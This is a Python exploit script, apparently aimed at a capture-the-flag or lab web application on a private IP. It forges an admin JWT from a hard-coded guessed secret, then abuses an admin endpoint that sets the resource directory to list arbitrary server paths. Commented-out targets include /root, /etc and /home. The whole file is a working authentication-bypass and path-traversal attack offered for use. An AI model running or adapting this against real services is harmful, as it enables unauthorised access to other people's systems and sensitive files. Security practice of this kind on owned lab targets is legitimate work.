#!/usr/bin/env python3
"""
清晰列出根目录和系统根目录文件
"""

import requests
import jwt
import json
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    """创建admin session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def list_directory(session, path, recursive=False, level=0):
    """列出目录内容"""
    # 设置resourceDir
    r = session.post(
        f"{BASE_URL}/admin/challengeResourceDir",
        data={"new-path": path}
    )
    
    if r.status_code != 200:
        return f"[!] 无法访问: {path}"
    
    # 列出文件
    r = session.get(f"{BASE_URL}/dashboard/list")
    
    if r.status_code != 200:
        return f"[!] 列出失败: {r.status_code}"
    
    try:
        items = r.json()
    except:
        return f"[!] 解析JSON失败"
    
    result = []
    indent = "  " * level
    
    for item in items:
        if isinstance(item, dict):
            name = item.get('name', 'unknown')
            is_dir = item.get('isDir', False)
            size = item.get('size', 0)
            
            if is_dir:
                result.append(f"{indent}📁 {name}/")
                if recursive and 'children' in item:
                    for child in item['children']:
                        result.extend(format_item(child, level + 1))
            else:
                result.append(f"{indent}📄 {name} ({size} bytes)")
    
    return result

def format_item(item, level=0):
    """格式化单个项目"""
    result = []
    indent = "  " * level
    
    if isinstance(item, dict):
        name = item.get('name', 'unknown')
        is_dir = item.get('isDir', False)
        size = item.get('size', 0)
        
        if is_dir:
            result.append(f"{indent}📁 {name}/")
            if 'children' in item:
                for child in item['children']:
                    result.extend(format_item(child, level + 1))
        else:
            result.append(f"{indent}📄 {name} ({size} bytes)")
    
    return result

def main():
    session = create_admin_session()
    
    paths_to_check = [
        ("Webapp根目录", "uploads"),
        # ("系统根目录", "/root"),
        # ("Home目录", "/home"),
        # ("Tmp目录", "/tmp"),
        # ("Opt目录", "/opt"),
        # ("Etc目录", "/etc"),
    ]
    
    for desc, path in paths_to_check:
        print(f"\n{'='*60}")
        print(f"📍 {desc}: {path}")
        print('='*60)
        
        files = list_directory(session, path)
        
        if isinstance(files, list):
            for f in files:
                print(f)
            print(f"\n总计: {len(files)} 个项目")
        else:
            print(files)

if __name__ == "__main__":
    main()
